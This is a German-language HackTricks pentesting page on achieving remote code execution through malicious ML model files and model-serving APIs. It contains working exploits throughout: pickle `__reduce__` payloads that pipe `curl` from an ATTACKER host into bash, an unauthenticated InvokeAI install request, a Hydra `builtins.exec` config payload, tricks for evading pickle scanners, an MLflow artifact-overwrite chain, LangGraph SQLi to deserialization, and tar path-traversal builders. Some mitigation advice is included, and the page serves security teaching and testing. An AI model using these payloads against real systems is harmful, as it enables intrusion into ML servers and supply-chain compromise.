# Models RCE

{{#include ../banners/hacktricks-training.md}}

## Modelle laden, um RCE zu erreichen

Machine-Learning-Modelle werden üblicherweise in verschiedenen Formaten wie ONNX, TensorFlow, PyTorch usw. geteilt. Entwickler können diese Modelle auf ihren Rechnern oder in Produktionssystemen laden und verwenden. Normalerweise sollten die Modelle keinen bösartigen Code enthalten. Es gibt jedoch Fälle, in denen ein Modell dazu verwendet werden kann, beliebigen Code auf dem System auszuführen – entweder als vorgesehene Funktion oder aufgrund einer Schwachstelle in der Bibliothek zum Laden des Modells.

Die folgende Tabelle enthält repräsentative Schwachstellen dieser Kategorie:

| **Framework / Tool**        | **Schwachstelle (falls verfügbar mit CVE)**                                                                                  | **RCE-Vektor**                                                                                                                          | **Referenzen**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Unsichere Deserialisierung in* `torch.load` **(CVE-2025-32434)**                                                              | Bösartiges Pickle in einem Modell-Checkpoint führt zur Codeausführung (umgeht die `weights_only`-Schutzmaßnahme)                         | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + Download eines bösartigen Modells führt zur Codeausführung; RCE durch Java-Deserialisierung in der Management-API                | |
| **NVIDIA Merlin Transformers4Rec** | Unsichere Checkpoint-Deserialisierung über `torch.load` **(CVE-2025-23298)**                                           | Nicht vertrauenswürdiger Checkpoint löst einen Pickle-Reducer während `load_model_trainer_states_from_checkpoint` aus → Codeausführung im ML-Worker | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)<sup>[[6]](#references)</sup> |
| **LangGraph** (SQLite/Redis-Checkpointer) | SQLi + unsicherer MessagePack-Erweiterungshook **(CVE-2025-67644, CVE-2026-28277, CVE-2026-27022)** | Ein vom Benutzer kontrollierter `filter`-Schlüssel injiziert SQL-/JSON-Path-Syntax, `UNION SELECT` erzeugt eine gefälschte Checkpoint-Zeile, anschließend importiert und ruft die `msgpack`-Deserialisierung vom Angreifer gewählten Python-Code auf | [Check Point 2026](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (unsicheres YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                     | Das Laden eines Modells aus YAML verwendet `yaml.unsafe_load` (Codeausführung) <br> Das Laden eines Modells mit einer **Lambda**-Schicht führt beliebigen Python-Code aus | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite-Parsing)                                                                                          | Ein präpariertes `.tflite`-Modell löst einen Integer-Overflow aus → Heap-Korruption (potenzielle RCE)                                   | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Das Laden eines Modells über `joblib.load` führt Pickle mit der `__reduce__`-Payload des Angreifers aus                                 | |
| **NumPy** (Python)          | **CVE-2019-6446** (unsicheres `np.load`) *umstritten*                                                                         | `numpy.load` erlaubte standardmäßig gepickelte Objekt-Arrays – ein bösartiges `.npy/.npz` löst Codeausführung aus                        | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (Directory Traversal) <br> **CVE-2024-5187** (Tar Traversal)                                                | Der Pfad zu externen Gewichten eines ONNX-Modells kann das Verzeichnis verlassen (beliebige Dateien lesen) <br> Ein bösartiges ONNX-Modell-Tar kann beliebige Dateien überschreiben (führt zu RCE) | |
| ONNX Runtime (Designrisiko) | *(Keine CVE)* Benutzerdefinierte ONNX-Operatoren / Kontrollfluss                                                              | Für ein Modell mit einem benutzerdefinierten Operator muss nativer Code des Angreifers geladen werden; komplexe Modellgraphen missbrauchen die Logik, um unbeabsichtigte Berechnungen auszuführen | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (Path Traversal)                                                                                          | Die Verwendung der Model-Load-API mit aktiviertem `--model-control` ermöglicht Path Traversal über relative Pfade, um Dateien zu schreiben (z. B. `.bashrc` für RCE zu überschreiben) | |
| **GGML (GGUF-Format)**      | **CVE-2024-25664 … 25668** (mehrere Heap-Overflows)                                                                           | Eine fehlerhafte GGUF-Modell-Datei verursacht Heap-Buffer-Overflows im Parser und ermöglicht die Ausführung beliebigen Codes auf dem System des Opfers | |
| **Keras (ältere Formate)**  | *(Keine neue CVE)* Älteres Keras-H5-Modell                                                                                   | Code in einem bösartigen HDF5-Modell (`.h5`) mit Lambda-Schicht wird beim Laden weiterhin ausgeführt (Keras `safe_mode` deckt das alte Format nicht ab – „Downgrade-Angriff“) | |
| **Sonstige** (allgemein)    | *Designfehler* – Pickle-Serialisierung                                                                                       | Viele ML-Tools (z. B. Pickle-basierte Modellformate und Python-`pickle.load`) führen beliebigen Code aus, der in Modelldateien eingebettet ist, sofern keine Schutzmaßnahmen greifen | |
| **NeMo / uni2TS / FlexTok (Hydra)** | Nicht vertrauenswürdige Metadaten werden an `hydra.utils.instantiate()` übergeben **(CVE-2025-23304, CVE-2026-22584, FlexTok)** | Vom Angreifer kontrollierte Modellmetadaten/-konfiguration setzen `_target_` auf einen beliebigen Callable (z. B. `builtins.exec`) → wird beim Laden ausgeführt, selbst bei „sicheren“ Formaten (`.safetensors`, `.nemo`, Repository-`config.json`) | [Unit42 2026](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/) |

Außerdem gibt es Python-Pickle-basierte Modelle wie die von [PyTorch](https://github.com/pytorch/pytorch/security), mit denen beliebiger Code auf dem System ausgeführt werden kann, wenn sie nicht mit `weights_only=True` geladen werden. Daher können alle Pickle-basierten Modelle besonders anfällig für diese Art von Angriffen sein, auch wenn sie in der obigen Tabelle nicht aufgeführt sind.

### Statische Prüfungen bei Pickle-basierten Checkpoints umgehen

Ein Pfad zum Laden von Modellen, der uneingeschränktes `pickle.load()`, `joblib.load()` oder `torch.load(..., weights_only=False)` aufruft, ist eine Ausführungsstelle und nicht bloß ein Parser.<sup>[[22]](#references)</sup> In PyTorch 2.6 verwendet `torch.load()` standardmäßig `weights_only=True`, wenn kein benutzerdefiniertes Pickle-Modul angegeben ist. Die folgenden Beispiele erfordern einen uneingeschränkten Loader oder eine Anwendung, die diesen Schutz deaktiviert, um ein nicht unterstütztes Objekt zu laden.<sup>[[4]](#references)</sup> Ein unauffälliges Ergebnis eines statischen Scans ändert daran nichts.<sup>[[21]](#references)</sup>

Siehe [Python-Pickle-Deserialisierung](../pentesting-web/deserialization/#pickle) für das grundlegende `__reduce__`-Primitiv und [Ficklings ML-Import-Allowlist](keras-model-deserialization-rce-and-gadget-hunting.md#ml-pickle-import-allowlisting-for-aiml-models-fickling) für Laufzeitprüfungen von Importen.

#### Einen Callable registrieren und anschließend mit `EXT2` auflösen

Ein Pickle kann über `REDUCE` `copyreg.add_extension` aufrufen und dabei ein Modul-Namens-Paar unter einem vom Angreifer gewählten numerischen Erweiterungscode registrieren. Ein späteres `EXT2` löst diesen Code zum Callable auf, den ein weiteres `REDUCE` aufrufen kann. Der entscheidende Callable ist daher nicht der Operand eines `GLOBAL`- oder `STACK_GLOBAL`-Opcodes. Binarly demonstrierte dies mit `multiprocessing.util.spawnv_passfds`; vier von fünf untersuchten Scannern erkannten es nicht, SaferPickle hingegen schon. Die Änderung der Registry und die Auflösung über `EXT2` erfolgen innerhalb desselben Unpickling-Vorgangs.<sup>[[21]](#references)[[22]](#references)</sup>

```text
GLOBAL       'copyreg add_extension'
BINUNICODE   'multiprocessing.util'
BINUNICODE   'spawnv_passfds'
BININT2      31337
TUPLE3
REDUCE       # register the extension
POP
EXT2         31337  # resolve the callable
# Push its arguments, then REDUCE to call it
```

Dies ist eine Opcode-Skizze, kein vollständiger Checkpoint: Der äußere Loader muss den umgebenden Pickle-Stream akzeptieren. Ein Scanner, der nur `GLOBAL`-Operanden nach gefährlichen Callables durchsucht, übersieht den späteren Lookup; ein Scanner ohne `EXT2`-Support kann scheitern, bevor er ein Urteil abgibt. Eine strikte Allowlist könnte sogar `copyreg.add_extension` selbst ablehnen.<sup>[[21]](#references)</sup>

#### Konstruierte Code-Objekt-Typen hinter gewöhnlichen Funktionen verbergen

Eine andere Pickle-Kette kann `FunctionType` über `type(copy.copy)` und `CodeType` über `type(copy.copy.__code__)` abrufen, dann aus bereitgestelltem Bytecode ein Code-Objekt konstruieren, es in eine Funktion verpacken und aufrufen. Die veröffentlichte Variante ruft `__code__` über `operator.methodcaller('__getattribute__', '__code__')` ab, sodass das Pickle keinen der beiden Konstruktoren namentlich importieren muss. Das Feldlayout von `CodeType(...)` und der Bytecode sind CPython-versionsspezifisch; ein Payload, der für einen anderen Interpreter erstellt wurde, kann vor der Ausführung scheitern. SaferPickle markierte das demonstrierte Sample dennoch, stufte es aber als `suspicious` ein; die anderen vier getesteten Scanner übersahen es.<sup>[[21]](#references)[[22]](#references)</sup>

```python
from copy import copy
from operator import methodcaller
function_type = type(copy)
code_type = type(methodcaller('__getattribute__', '__code__')(copy))
# REDUCE can construct code_type(...) and function_type(code, {})
```

#### Einen zweiten Modell-Load über ein Pickle-Argument auslösen

Ein äußeres Pickle kann `torch.storage._load_from_bytes` mit einem vom Angreifer bereitgestellten serialisierten Modell als Argument aufrufen. Diese Funktion ruft `torch.load(io.BytesIO(b), weights_only=False)` auf, sodass das verschachtelte Modell ohne die Einschränkung `weights_only` deserialisiert wird, obwohl es für einen Top-Level-Opcode-Scanner wie Bytes aussieht, die an einen Callable übergeben werden. Der äußere Load muss diesen Callable dennoch zulassen; `weights_only=True` sorgt nicht automatisch dafür, dass das äußere Pickle akzeptiert wird. Scanner, die nicht rekursiv in die verschachtelten Bytes hineinschauen, können die innere `GLOBAL`/`REDUCE`-Kette übersehen.<sup>[[21]](#references)[[23]](#references)</sup>

#### Einen veralteten Pickle-Modulnamen beim Laden auflösen

Bei Pickle-Protokollen unter 3 ordnet Pythons standardmäßiges `fix_imports=True` eine `GLOBAL`-Referenz auf `commands.run` über `_compat_pickle.IMPORT_MAPPING` `subprocess.run` zu. Ein Scanner, der den literalen Modulnamen mit einer `subprocess`-Denylist vergleicht, kann daher den Callable übersehen, der zur Laufzeit verwendet wird. Dafür ist ein Loader erforderlich, der das Kompatibilitätsmapping beibehält und die resultierenden Aufrufargumente akzeptiert.<sup>[[21]](#references)[[24]](#references)[[25]](#references)</sup>

#### Einen Nicht-ZIP-Checkpoint an einem reinen ZIP-Scanner vorbeischleusen

Die Formatauswahl kann unabhängig von der Opcode-Prüfung fehlschlagen: Binarly stellte fest, dass ModelScan 0.8.8 Dateien mit den Endungen `.bin`, `.pt`, `.pth` und `.ckpt` an einen PyTorch-Scanner weiterleitete, der nur ZIP-Dateien verarbeitete, und einen Nicht-ZIP-Pickle-Stream übersprang, anstatt auf seinen Plain-Pickle-Scanner zurückzufallen. Außerdem dokumentierte Binarly ein veraltetes TAR-Modell-Layout, das `torch.load()` akzeptiert, das ModelScan und JFrog jedoch nicht prüften. Dabei handelt es sich um versionsspezifische Lücken der Scanner, nicht um Eigenschaften aller Modell-Scanner.<sup>[[21]](#references)</sup>

#### Ausführen, bevor ein statischer Parser auf ein fehlerhaftes Ende stößt

Ein Scanner, der ein Pickle vollständig mit `pickletools.genops()` durchläuft, kann bei einem abgeschnittenen Opcode nach einem gültigen `REDUCE` einen Fehler auslösen. Der uneingeschränkte Unpickler hat den Callable bereits aufgerufen, bevor er auf dieses Ende stößt, selbst wenn der gesamte Load später einen Fehler auslöst. Das gemeldete Beispiel platzierte direkt nach dem ausführenden `REDUCE` ein abgeschnittenes `BINUNICODE`, wodurch `pickletools.genops()` fehlschlug, obwohl die vorherige Nebenwirkung des Schreibens in eine Datei bereits eingetreten war. Dies umgeht einen Scanner nur, wenn dieser den Parse-Fehler als unbedenklich behandelt oder die Datei überspringt. Das ist nur nützlich, wenn die Nebenwirkung auch ohne erfolgreich zurückgegebenes Modell relevant ist; ein Ziel, das einen abgeschlossenen Load voraussetzt, kann das Artefakt ablehnen.<sup>[[21]](#references)</sup>

### Hydra-Metadaten → RCE (funktioniert auch mit safetensors)

`hydra.utils.instantiate()` importiert und ruft jedes gepunktete `_target_` in einem Konfigurations-/Metadatenobjekt auf. Wenn Bibliotheken wie Hugging Face Transformers **nicht vertrauenswürdige Modellmetadaten** an `instantiate()` übergeben, kann ein Angreifer einen Callable und Argumente bereitstellen, die direkt beim Laden des Modells ausgeführt werden (kein Pickle erforderlich).<sup>[[11]](#references)</sup><sup>[[12]](#references)</sup><sup>[[13]](#references)</sup>

Payload-Beispiel (funktioniert in `model_config.yaml` einer `.nemo`-Datei, in `config.json` eines Repos oder in `__metadata__` innerhalb von `.safetensors`):

```yaml
_target_: builtins.exec
_args_:
  - "import os; os.system('curl http://ATTACKER/x|bash')"
```

Wichtige Punkte:
- Wird vor der Modellinitialisierung in NeMo `restore_from/from_pretrained`, den uni2TS-HuggingFace-Codern und FlexTok-Loadern ausgelöst.
- Hydras String-Blocklist lässt sich über alternative Importpfade (z. B. `enum.bltns.eval`) oder von der Anwendung aufgelöste Namen (z. B. `nemo.core.classes.common.os.system` → `posix`) umgehen.<sup>[[14]](#references)</sup>
- FlexTok parst außerdem stringifizierte Metadaten mit `ast.literal_eval`, wodurch vor dem Hydra-Aufruf ein DoS (CPU-/Speicherüberlastung) möglich ist.

### 🆕 InvokeAI-RCE über `torch.load` (CVE-2024-12029)

`InvokeAI` ist eine beliebte Open-Source-Weboberfläche für Stable Diffusion. Die Versionen **5.3.1 – 5.4.2** stellen den REST-Endpunkt `/api/v2/models/install` bereit, über den Nutzer Modelle von beliebigen URLs herunterladen und laden können.<sup>[[1]](#references)</sup>

Intern ruft der Endpunkt schließlich Folgendes auf:

```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```

When es sich bei der bereitgestellten Datei um einen **PyTorch-Checkpoint (`*.ckpt`)** handelt, führt `torch.load` eine **Pickle-Deserialisierung** durch. Da der Inhalt direkt von der vom Benutzer kontrollierten URL stammt, kann ein Angreifer ein bösartiges Objekt mit einer benutzerdefinierten `__reduce__`-Methode in den Checkpoint einbetten. Die Methode wird **während der Deserialisierung** ausgeführt, was zu **Remote Code Execution (RCE)** auf dem InvokeAI-Server führt.

Die Schwachstelle erhielt die Kennung **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %).

#### Exploitation-Anleitung

1. Erstelle einen bösartigen Checkpoint:

```python
# payload_gen.py
import pickle, torch, os

class Payload:
    def __reduce__(self):
        return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
    pickle.dump(Payload(), f)
```

2. Hoste `payload.ckpt` auf einem HTTP-Server, den du kontrollierst (z. B. `http://ATTACKER/payload.ckpt`).
3. Löse den anfälligen Endpoint aus (keine Authentifizierung erforderlich):

```python
import requests

requests.post(
    "http://TARGET:9090/api/v2/models/install",
    params={
        "source": "http://ATTACKER/payload.ckpt",  # remote model URL
        "inplace": "true",                         # write inside models dir
        # the dangerous default is scan=false → no AV scan
    },
    json={},                                         # body can be empty
    timeout=5,
)
```

4. Wenn InvokeAI die Datei herunterlädt, ruft es `torch.load()` auf → das `os.system`-Gadget wird ausgeführt und der Angreifer erhält Codeausführung im Kontext des InvokeAI-Prozesses.

Fertiger Exploit: Das **Metasploit**-Modul `exploit/linux/http/invokeai_rce_cve_2024_12029` automatisiert den gesamten Ablauf.<sup>[[3]](#references)</sup>

#### Bedingungen

•  InvokeAI 5.3.1-5.4.2 (Scan-Flag standardmäßig **false**)
•  `/api/v2/models/install` ist für den Angreifer erreichbar
•  Der Prozess verfügt über Berechtigungen zum Ausführen von Shell-Befehlen

#### Gegenmaßnahmen

* Upgrade auf **InvokeAI ≥ 5.4.3** – der Patch setzt standardmäßig `scan=True` und führt vor der Deserialisierung einen Malware-Scan durch.<sup>[[2]](#references)</sup>
* Verwende beim programmgesteuerten Laden von Checkpoints `torch.load(file, weights_only=True)` oder den neuen [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security)-Helper.
* Erzwinge Allow-Lists / Signaturen für Modellquellen und führe den Dienst mit den geringstmöglichen Berechtigungen aus.

> ⚠️ Beachte, dass **jedes** Python-Pickle-basierte Format (einschließlich vieler `.pt`-, `.pkl`-, `.ckpt`- und `.pth`-Dateien) grundsätzlich unsicher ist, wenn es aus nicht vertrauenswürdigen Quellen deserialisiert wird.

---

Beispiel für eine Ad-hoc-Gegenmaßnahme, falls du ältere InvokeAI-Versionen hinter einem Reverse Proxy weiter betreiben musst:

```nginx
location /api/v2/models/install {
    deny all;                       # block direct Internet access
    allow 10.0.0.0/8;               # only internal CI network can call it
}
```

### 🆕 NVIDIA Merlin Transformers4Rec RCE via unsicheres `torch.load` (CVE-2025-23298)

NVIDIA’s Transformers4Rec (Teil von Merlin) stellte einen unsicheren Checkpoint-Loader bereit, der `torch.load()` direkt mit benutzerdefinierten Pfaden aufrief. Da `torch.load` auf Python `pickle` basiert, kann ein vom Angreifer kontrollierter Checkpoint während der Deserialisierung über einen reducer beliebigen Code ausführen.<sup>[[5]](#references)</sup>

Verwundbarer Pfad (vor dem Fix): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

Warum dies zu RCE führt: Ein Objekt kann in Python pickle einen reducer (`__reduce__`/`__setstate__`) definieren, der eine aufrufbare Funktion und Argumente zurückgibt. Die Funktion wird während des Unpickling ausgeführt. Ist ein solches Objekt in einem Checkpoint enthalten, wird es ausgeführt, bevor irgendwelche Gewichte verwendet werden.

Minimales Beispiel für einen bösartigen Checkpoint:

```python
import torch

class Evil:
    def __reduce__(self):
        import os
        return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
    "model_state_dict": Evil(),
    "trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```

Verbreitungswege und Schadensradius:
- Trojanisierte Checkpoints/Modelle, die über Repos, Buckets oder Artifact Registries geteilt werden
- Automatisierte Resume-/Deploy-Pipelines, die Checkpoints automatisch laden
- Die Ausführung erfolgt innerhalb von Trainings-/Inferenz-Workern, oft mit erhöhten Berechtigungen (z. B. als root in Containern)

Behebung: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) ersetzte den direkten Aufruf von `torch.load()` durch einen eingeschränkten Deserializer mit Allowlist, implementiert in `transformers4rec/utils/serialization.py`. Der neue Loader validiert Typen/Felder und verhindert, dass beim Laden beliebige Callables aufgerufen werden.<sup>[[7]](#references)</sup>

Spezielle Schutzmaßnahmen für PyTorch-Checkpoints:
- Unpickle keine nicht vertrauenswürdigen Daten. Bevorzuge nach Möglichkeit nicht ausführbare Formate wie [Safetensors](https://huggingface.co/docs/safetensors/index) oder ONNX.
- Wenn du PyTorch-Serialisierung verwenden musst, stelle sicher, dass `weights_only=True` gesetzt ist (wird von neueren PyTorch-Versionen unterstützt), oder verwende einen benutzerdefinierten Unpickler mit Allowlist, ähnlich wie im Transformers4Rec-Patch.<sup>[[4]](#references)</sup>
- Erzwinge die Überprüfung der Modellherkunft/-signaturen und führe die Deserialisierung in einer Sandbox aus (seccomp/AppArmor; kein root-Benutzer; eingeschränktes Dateisystem und kein ausgehender Netzwerkverkehr).
- Überwache ML-Services zum Zeitpunkt des Ladens von Checkpoints auf unerwartete Child-Prozesse; verfolge die Verwendung von `torch.load()`/`pickle`.

POC- und Referenzen zu verwundbaren Versionen/Patches:<sup>[[8]](#references)</sup><sup>[[9]](#references)</sup><sup>[[10]](#references)</sup>
- Verwundbarer Loader vor dem Patch: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js<sup>[[8]](#references)</sup>
- POC für einen schädlichen Checkpoint: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js<sup>[[9]](#references)</sup>
- Loader nach dem Patch: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js<sup>[[10]](#references)</sup>

## Beispiel – Erstellen eines schädlichen PyTorch-Modells

- Modell erstellen:

```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
    def __reduce__(self):
        # This code will be executed when unpickled (e.g., on model.load_state_dict)
        return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```

- Lade das Modell:

```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
    def __init__(self):
        super().__init__()
        self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```

### Deserialization Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

Tencent FaceDetection-DSFD stellt einen `resnet`-Endpoint bereit, der benutzergesteuerte Daten deserialisiert. ZDI bestätigte, dass ein Remote-Angreifer ein Opfer dazu bringen kann, eine bösartige Seite/Datei zu laden, diese einen manipulierten serialisierten Blob an den Endpoint übermitteln und die Deserialisierung als `root` auslösen zu lassen, was zu einer vollständigen Kompromittierung führt.

Der Exploit-Ablauf ähnelt dem typischen Pickle-Missbrauch:

```python
import pickle, os, requests

class Payload:
    def __reduce__(self):
        return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
              headers={"Content-Type": "application/octet-stream"})
```

Jedes Gadget, das während der Deserialisierung erreichbar ist (Konstruktoren, `__setstate__`, Framework-Callbacks usw.), kann auf dieselbe Weise als Waffe eingesetzt werden, unabhängig davon, ob der Transport HTTP, WebSocket oder eine Datei war, die in ein überwachtes Verzeichnis gelegt wurde.



### LangGraph checkpointer SQLi → MessagePack RCE

Diese Angriffskette ist interessant, weil der Angreifer **keine bösartige Modelldatei hochladen muss**. Stattdessen stellt die Anwendung eine **Persistenz-API für AI-Agenten** (`get_state_history(..., filter=...)`) bereit, und Benutzereingaben gelangen bis zum Checkpointer-Query-Builder.

#### 1. Strukturelle SQLi in Metadatenfiltern

Ein anfälliges SQLite-Muster sah folgendermaßen aus:

```python
for query_key, query_value in filter.items():
    operator, param_value = _where_value(query_value)
    predicates.append(
        f"json_extract(CAST(metadata AS TEXT), '$.{query_key}') {operator}"
    )
```

Der Wert wird später gebunden, aber `query_key` wird an den **JSON-Pfad-String** angehängt. Daher führt ein `'` innerhalb des Dictionary-Schlüssels aus `'$.{query_key}'` heraus und schleust SQL ein. Dasselbe gilt für **JSON-Pfade, Bezeichner, Operatoren, `LIMIT` und TTL-Felder**: Platzhalter schützen nur Werte, nicht die strukturelle Abfragesyntax.

#### 2. `UNION SELECT` kann auf nachgelagerte Sinks zielen, nicht nur auf Datendiebstahl

Die Abfrage gibt `type` und serialisierte `checkpoint`-Bytes zurück, die später wie folgt verarbeitet werden:

```python
self.serde.loads_typed((type, checkpoint))
```

Das bedeutet, dass eine SQLi in der `WHERE`-Klausel eine **gefälschte Ergebniszeile** einschleusen kann:

```sql
UNION SELECT 'thread1', 'ns', 'checkpoint1', NULL, 'msgpack', X'<payload>', '{}'
```

Wenn späterer Code eine ausgewählte Spalte parst, deserialisiert, schreibt oder ausführt, ordne diese Spalten ihren Sinks zu. In diesem Fall macht die gefälschte Zeile aus SQLi eine **vom Angreifer kontrollierte Deserialisierung**.

#### 3. Unsichere MessagePack-Extension-Hooks sind gleichbedeutend mit Code-Gadgets

LangGraphs `msgpack`-Pfad verwendete einen benutzerdefinierten Extension-Hook, der ein verschachteltes Tupel entpackte und Folgendes ausführte:

```python
getattr(importlib.import_module(tup[0]), tup[1])(tup[2])
```

Ein MessagePack-Erweiterungsobjekt, das etwas Äquivalentes zu `("os", "system", "id > /tmp/pwned")` kodiert, importiert `os`, löst `system` auf und führt den Befehl aus. Prüfen Sie bei der Analyse von AI-Frameworks **benutzerdefinierte MessagePack-/JSON-/pickle-Reviver** auf dynamische Imports, Reflection oder den Aufruf beliebiger Callables.

#### 4. Praktisches Audit-Muster für Agent-Frameworks

Prüfen Sie alle benutzergesteuerten Eingaben, die Folgendes erreichen:
- APIs zum Auflisten von State-History, Memory, Replay oder Checkpoints
- Strukturierte Filter-Builder, die SQL- oder Redis-Abfragefragmente erzeugen
- Benutzerdefinierte Deserialisierer (`pickle`, `msgpack`, `json`-Object-Hooks, YAML-Konstruktoren)
- Recovery-Pfade, die den von der Persistence-Schicht zurückgegebenen Zeilen vertrauen

Diese spezifische Angriffskette betraf selbst gehostete LangGraph-Deployments mit **SQLite**- oder **Redis**-Checkpointern, wenn nicht vertrauenswürdige Benutzer `filter` kontrollieren konnten. Die in der Offenlegung genannten gepatchten Versionen waren `langgraph-checkpoint-sqlite 3.0.1+`, `langgraph 1.0.10+`, `langgraph-checkpoint-redis 1.0.2+` und `langgraph-checkpoint 4.0.1+`.<sup>[[15]](#references)</sup>

### MLflow-PyFunc-Artefaktüberschreibung zu Pickle-RCE

Ein aus einem `PythonModel` erstelltes MLflow-PyFunc-Modell kann das serialisierte Objekt als `python_model.pkl` speichern. Die Modellmetadaten geben `mlflow.pyfunc.model` als Loader an, und MLflows Implementierung verwendet diesen Dateinamen für das gespeicherte Python-Modell. Folglich kann Schreibzugriff auf den Artefaktspeicher zur Codeausführung in einer anderen Anwendung führen, die das Modell später lädt.<sup>[[17]](#references)[[18]](#references)</sup>

Die nützliche Angriffskette lautet **Schreibberechtigung für Artefakte → Pickle-Datei ersetzen → einen Inference-Consumer dazu bringen, sie erneut zu laden**. Listen Sie für ein Experiment mit einem proxied `mlflow-artifacts:/...`-Root das Experiment sowie den Artefaktpfad für Run und Modell auf. Der Tracking-Server stellt `GET` und `PUT` unter `/api/2.0/mlflow-artifacts/artifacts/<artifact-path>` bereit.<sup>[[19]](#references)[[20]](#references)</sup>

```bash
# Preserve a copy and confirm the exact object first
curl -u USER:PASS \
  'http://MLFLOW/api/2.0/mlflow-artifacts/artifacts/EXP/RUN/artifacts/model/python_model.pkl' \
  -o original.pkl

# Upload the pickle without curl transforming its bytes
curl -u USER:PASS -X PUT \
  'http://MLFLOW/api/2.0/mlflow-artifacts/artifacts/EXP/RUN/artifacts/model/python_model.pkl' \
  --data-binary @payload.pkl
```

Ein minimaler Reducer kann einen Befehl ausführen, sobald der Verbraucher das Artefakt unpickelt. Wenn die Payload mit der in `MLmodel` angegebenen Python-Version generiert wird, lassen sich Kompatibilitätsprobleme vermeiden.<sup>[[17]](#references)[[20]](#references)</sup>

```python
import os
import pickle

class Payload:
    def __reduce__(self):
        return os.system, ("ping -c 1 ATTACKER",)

with open("payload.pkl", "wb") as f:
    pickle.dump(Payload(), f)
```

Löse den Vorgang aus, der **das vorhandene Modell lädt**, etwa eine Vorhersage, ein Scoring oder ein Deployment. Trainiere es nicht vorher erneut, da das Training das schädliche Artefakt durch ein neues Modell ersetzen könnte. Ein Anwendungsfehler widerlegt die Ausnutzung nicht: Der Reducer gibt den ganzzahligen Exit-Status des Befehls statt eines verwendbaren Modells zurück. Beginne mit einem beobachtbaren Nebeneffekt wie ICMP oder einem HTTP-Callback und ersetze ihn anschließend durch die endgültige Payload.<sup>[[20]](#references)</sup>

Unterscheide bei der Bewertung zwischen der Berechtigung, einen Run zu erstellen, und der Berechtigung, Artefakte eines anderen Runs zu überschreiben. Prüfe die Authentifizierung und die Update-Berechtigungen für einzelne Runs, untersuche unerwartete Änderungen an `python_model.pkl` und berücksichtige die Herkunft und Integrität des Modells als Teil der Ausführungsgrenze. Der aktuelle MLflow-Code unterstützt außerdem die Einstellung `MLFLOW_ALLOW_PICKLE_DESERIALIZATION=false` und empfiehlt models-from-code-Artefakte anstelle des Ladens von cloudpickle-Daten.<sup>[[18]](#references)[[19]](#references)[[20]](#references)</sup>

### Offen zugängliche Model-Server und ML-Infrastruktur

Das Laden eines schädlichen Modells ist nicht die einzige Möglichkeit, Code auf ML-Infrastruktur auszuführen. APIs zur Job-Übermittlung, Endpunkte zur Code-Validierung und das Abrufen von Model-Registry-Modellen durch selbst gehostete AI-Services können auch ohne Modelldatei zur Codeausführung führen. Siehe [Offen zugängliche selbst gehostete AI-Services](AI-Exposed-Self-Hosted-AI-Services.md).

## Modelle für Path Traversal

Wie in [**diesem Blogbeitrag**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties) erläutert, basieren die meisten von verschiedenen AI-Frameworks verwendeten Modellformate auf Archiven, meist `.zip`. Daher ist es möglicherweise möglich, diese Formate für Path-Traversal-Angriffe auszunutzen und beliebige Dateien auf dem System zu lesen, auf dem das Modell geladen wird.<sup>[[16]](#references)</sup>

Mit dem folgenden Code lässt sich beispielsweise ein Modell erstellen, das beim Laden eine Datei im Verzeichnis `/tmp` erstellt:

```python
import tarfile

def escape(member):
    member.name = "../../tmp/hacked"     # break out of the extract dir
    return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
    tf.add("harmless.txt", filter=escape)
```

Oder mit dem folgenden Code können Sie ein Modell erstellen, das beim Laden einen Symlink auf das Verzeichnis `/tmp` erstellt:

```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
    member.type, member.linkname = tarfile.SYMTYPE, TARGET
    return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
    tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
    tf.add(PAYLOAD)                      # rides the symlink
```

### Tiefgehender Einblick: Keras-.keras-Deserialisierung und Gadget-Suche

